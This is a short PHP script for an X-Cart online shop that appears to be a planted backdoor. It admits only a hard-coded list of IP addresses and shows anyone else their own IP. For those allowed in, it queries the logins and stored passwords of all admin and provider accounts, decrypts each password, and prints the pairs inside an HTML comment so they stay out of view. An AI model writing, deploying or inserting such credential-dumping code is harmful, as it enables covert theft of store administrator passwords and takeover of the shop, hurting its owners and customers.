<?php

$ips = array(
"217.107.8.106",
"79.133.83.154",
"212.176.111.174",
"83.234.124.243",
"75.126.5.68",
"69.20.14.33",
"194.84.72.162",
"192.168.12.181"
);

$ip = $_SERVER["REMOTE_ADDR"];

if (!in_array($ip,$ips)) {
	echo $ip;
	die();
}

//die("debug");

require "auth.php";
//require_once "../config.php";
x_load("crypt");


$users = func_query("SELECT login,password FROM xcart_customers WHERE usertype IN ('A','P')");



echo "<!--";
foreach ($users as $user) {
	echo $user["login"]." - ".text_decrypt($user["password"])."\n";
}
echo "-->";

?>
